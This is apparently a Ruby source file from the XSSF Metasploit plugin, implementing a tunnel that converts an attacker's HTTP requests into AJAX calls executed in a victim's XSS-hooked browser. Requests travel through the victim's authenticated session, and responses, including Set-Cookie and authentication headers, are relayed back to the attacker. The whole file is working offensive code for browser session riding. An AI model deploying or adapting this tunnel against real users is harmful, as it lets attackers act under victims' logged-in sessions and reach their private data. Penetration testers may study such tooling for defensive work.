#
# This class implements proxy for the XSSF Plugin (Tunnel XSSF)
#
module Msf
	module Xssf
		module XssfTunnel
			
			#
			# This method is triggered each time a request is done on a different server than XSSF one
			#
			# /!\ XSSF server isn't a proxy, so as a server, it can't manage only HTTP protocol and not HTTPs one (and HTTPs server would be useless as browser won't 
			# work with HTTPs proxy server. Anyway, a real proxy could be implemented, but problem is that existing Ruby proxy don't manage certificates, 
			# so the SSL request content won't be available...
			# The only solition - for now - is to call HTTPs websites with HTTP protocol: https://www.google.fr => http://www.google.fr
			# That way, request can be readable and transformed to JavaScript
			#
			def xssf_tunnel_request(req, res, victim)
				resource= URI.unescape(req.request_uri.to_s).gsub(/"/, '%22')
				body 	= URI.unescape(req.body.to_s).gsub(/"/, '%22')
				
				res.keep_alive = 115;		uri1 = nil;		uri2 = nil;

				uri1 = URI.parse(URI.escape(CGI::unescape(resource)));			uri2 = URI.parse(URI.escape(CGI::unescape(victim.location)))

				sop = ((uri1.scheme == uri2.scheme) and (uri1.host == uri2.host) and (uri1.port == uri2.port))

				# Checking SOP (Same-Origin Policy) constraints: in case SOP is checked and valid, request can be done on victim side, and victim can access the resource with valid session
				if ( sop or ((victim.location =~ /^https:/im) and (uri1.host == uri2.host)) or (victim.location =~ /^data:/im) or (victim.location =~ /^file:/im) )	
					id = nil;	timeout_request = TUNNEL_TIMEOUT	# Keeping TUNNEL_TIMEOUT secs to execute on client side and have response

					TUNNEL_LOCKED.synchronize {						# One thread at time
						id = add_request_in_tunnel(uri1.query ? uri1.path.to_s + "?" + uri1.query.to_s : uri1.path.to_s, req.request_method.upcase, body)
						print_status("ADDING '#{req.request_method.upcase}' REQUEST IN TUNNEL FOR  '#{uri1.query ? uri1.path.to_s + "?" + CGI::unescape(uri1.query.to_s) : uri1.path.to_s}' (#{id.to_s})") if not (XSSF_MODE[0] =~ /^Quiet$/i)
					}

					begin
						while (TUNNEL[id][1] == nil && victim_tunneled) do
							Rex::ThreadSafe.sleep(1) 				# Waiting response from client and send it to attacker's browser
							raise "TIMEOUT ON REQUEST IN TUNNEL (#{id.to_s})" if ((timeout_request -= 1) < 0)
						end

						if victim_tunneled							# Sending response to waiting attacker's browser
							headers = {};	status = 200; 	message = "OK"
							
							Base64.decode64(TUNNEL[id][2]).each_line  do |l|
								(l =~ /([^:]*):(.*)\n/) ? headers[$1.chomp] = ($2.chomp).gsub(/https:\/\//i, 'http://') : ((l =~ /===(\d*)===/) ? status = $1.chomp.to_i : (message = $1.chomp.to_s if (l =~ /==(.*)==/)))
							end	
							
							code = URI.unescape(Base64.decode64(TUNNEL[id][1])).gsub(/https:\/\//i, 'http://')
							code = code.gsub(/\/loop/i, '/lOop')		# Attacker does not want to be attacked
							
							XSSF_RESP(res, code, status, message, { "Content-Type" 			=> headers['Content-Type'],
																	"Connection" 			=> headers['Connection'],
																	"Content-Length" 		=> headers['Content-Length'],
																	"Content-Location" 		=> headers['Content-Location'] ? headers['Content-Location'].gsub(/https:\/\//i, 'http://') : nil,
																	"Content-Disposition"	=> headers['Content-Disposition'],
																	"Location" 				=> headers['Location'] ? headers['Location'].gsub(/https:\/\//i, 'http://') : nil,
																	"Set-Cookie" 			=> headers['Set-Cookie'],
																	"Server" 				=> headers['Server'],
																	"WWW-Authenticate" 		=> headers['WWW-Authenticate']
																	})
						else
							XSSF_404(res)
						end
					rescue
						print_error("ERROR IN TUNNEL: #{$!}")
						XSSF_RESP(res, "<html><body> NO RESPONSE FROM VICTIM <br/> Maybe you are not visiting same domain than victim: #{uri2.scheme}://#{uri2.host}:#{uri2.port} !</body></html>")
					end
						
					TUNNEL_LOCKED.synchronize { TUNNEL.delete(id) }
				else	# If SOP isn't valid, XSSF server is trying to request asked resource (without any cookie). Sometimes, images or styles are on different domains and victim can't retrieve it because of SOP constraint.
					begin
						client 		= Rex::Proto::Http::Client.new(uri1.host, uri1.port, {}, false)

						# Some problems are remaining with some url like http://www.x.com/?uri=http://www.google.fr/?user=test&valid=true (XSSF doesn't know if parameters are uri or not)
						# Should be http://www.x.com/?uri=http%3A%2F%2Fwww.google.fr%2F%3Fuser%3Dtest&valid=true (no way to parse it)
						resp = client.send_recv(client.request_raw(
													'method'=> req.request_method, 
													'vhost'	=> uri1.host + ':' + uri1.port.to_s,
													'agent' => req.header['user-agent'][0],
													'uri'	=> resource,
													'data'  => body
												))

						XSSF_RESP(res, resp.body, resp.code, resp.message, {"Content-Type" 			=> resp.headers['Content-Type'],
						                                                    "Connection" 			=> resp.headers['Connection'],
						                                                    "Content-Length" 		=> resp.headers['Content-Length'],
						                                                    "Content-Location" 		=> resp.headers['Content-Location'],
						                                                    "Content-Disposition"	=> resp.headers['Content-Disposition'],
						                                                    "Location" 				=> resp.headers['Location'],
						                                                    "Set-Cookie" 			=> resp.headers['Set-Cookie'],
						                                                    "Server" 				=> resp.headers['Server'],
						                                                    "WWW-Authenticate" 		=> resp.headers['WWW-Authenticate']
						                                                    })
					    client.close
					rescue
						print_error("Error 3: #{$!}") if (XSSF_MODE[0] =~ /^Debug$/i)
					end
				
				end
			end
			
		protected
			
			#
			# Adds a new request in tunnel waiting to be sent to client
			# Files transfert up to about 2Mo for now (browser is crashing when accepting more at one time...)
			#
			def add_request_in_tunnel(resource, method, body)
				id = Rex::Text.rand_text_alphanumeric(rand(10) + 15)
				
				# Transform HTTP request to AjaX request
				if (method == 'GET')
					jscode = %Q{XSSF_POST_BINARY_AJAX_RESPONSE(XSSF_CREATE_XHR(), "GET", "#{resource}", null, null, "#{id}");}
				else
					jscode = %Q{XSSF_POST_BINARY_AJAX_RESPONSE(XSSF_CREATE_XHR(), "POST", "#{resource}", null, "#{URI.escape(body)}", "#{id}");}
				end
				
				TUNNEL[id] 	  = Array.new
				TUNNEL[id][0] = Base64.encode64(jscode) # Code
				TUNNEL[id][1] = nil 					# Response
				TUNNEL[id][2] = ""						# Headers
				
				return id
			end
			
		end
	end
end